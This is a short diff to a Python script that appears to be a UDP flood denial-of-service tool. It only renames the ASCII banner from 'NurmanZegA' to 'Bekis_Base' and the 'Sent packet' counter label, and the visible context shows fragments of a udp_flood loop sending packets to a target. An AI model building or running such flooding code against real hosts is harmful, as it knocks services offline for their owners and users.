@@ -13,7 +13,7 @@ print '''###############################
 
 # Clear the terminal
 os.system("clear")
-os.system("figlet NurmanZegA")
+os.system("figlet Bekis_Base")
 
 
 print()
@@ -62,7 +62,7 @@ def udp_flood(ip, port, message, dur):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"Sent packet ZegA{packet_count}")
+            print(f"Sent packet Bekis{packet_count}")
         except socket.error:
             # If the socket is not able to send the packet, break the loop
             break
